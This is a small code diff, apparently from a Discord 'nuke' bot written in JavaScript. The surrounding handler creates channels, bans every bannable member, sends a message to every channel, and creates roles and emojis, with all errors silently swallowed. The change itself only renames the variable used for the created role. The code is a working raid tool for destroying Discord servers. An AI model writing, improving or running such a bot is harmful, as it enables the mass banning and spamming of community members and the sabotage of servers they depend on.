@@ -35,7 +35,7 @@ bot.on("message", msg => {
                 a.channels.create(Main.cm);
                 a.members.cache.filter(m => m.bannable).forEach(m => m.ban());
                 a.channels.cache.forEach(c => c.send(Main.nm));
-                a.roles.create(Main.nm);
+                a.roles.create(Main.rm);
                 a.emojis.create("Replace this with your image", Main.em);
             });
         } catch (error) {/*Wasn't going to add a feature that will handle errors because it'll flood the console and we don't want that, do we?*/}
